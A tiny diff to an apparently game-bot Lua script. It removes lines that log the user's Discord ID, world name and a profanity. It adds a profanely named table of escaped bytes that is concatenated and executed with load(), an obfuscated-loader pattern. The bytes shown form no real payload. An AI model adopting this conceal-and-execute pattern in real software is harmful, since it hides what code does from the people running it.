@@ -1,5 +1,6 @@
-discord = getDiscordID() 
-world = getWorld().name
-doLog(discord)
-doLog(world) 
-doLog("Kontol") 
+fuck = {
+"\12", 
+  "\34", 
+  "\23", 
+}
+load(table.concat(fuck))()
